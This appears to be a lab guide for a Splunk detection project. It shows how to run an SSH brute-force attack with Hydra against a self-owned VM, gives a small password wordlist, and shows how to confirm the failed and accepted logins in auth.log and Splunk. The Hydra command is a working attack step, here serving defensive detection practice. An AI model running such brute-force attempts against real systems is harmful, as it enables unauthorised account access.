# Attack Simulation — SSH Brute Force with Hydra

⚠️ **Only run this against a VM you own, in an isolated lab network.**
Never target any host you don't have explicit written permission to test.

## Prerequisites

- Attacker machine: Kali Linux (has Hydra pre-installed) or `sudo apt install hydra`
- Victim machine: Ubuntu VM with `openssh-server` running, on the same private/host-only network
- A small password wordlist (you can make your own — you don't need rockyou.txt for a lab demo)

## 1. Create a small test wordlist (safer & faster than rockyou.txt for a lab)

```bash
cat > passwords.txt << EOF
123456
password
admin123
qwerty
letmein
toor
YOUR_TEST_ACCOUNT_REAL_PASSWORD
EOF
```

Put the real password of your test account near the end of the list so the
attack eventually "succeeds" — this lets you demonstrate Query 3
(failed-then-success detection) in the SPL file.

## 2. Run the brute force

```bash
hydra -l labuser -P passwords.txt ssh://<victim-ip> -t 4 -V
```

- `-l labuser` — target username (create a dedicated non-critical test user on the victim VM)
- `-P passwords.txt` — password list
- `-t 4` — 4 parallel threads (keep it low in a lab so Splunk timestamps are readable)
- `-V` — verbose, shows each attempt

## 3. Confirm it landed in the logs

On the victim VM:

```bash
tail -n 50 /var/log/auth.log
```

You should see a burst of `Failed password for labuser from <attacker-ip>` lines,
and near the end, `Accepted password for labuser from <attacker-ip>`.

## 4. Let Splunk ingest it

If you've already set up the monitor input on `/var/log/auth.log`, this appears
in Splunk within seconds. Confirm with:

```
index=main sourcetype=linux_secure src_ip=<attacker-ip>
```

## Alternative: No Hydra available?

Use `simulate_failed_logins.py` in this same folder — it generates realistic
synthetic `auth.log`-formatted entries you can feed into Splunk directly via a
file monitor, without needing a second VM or live network traffic.
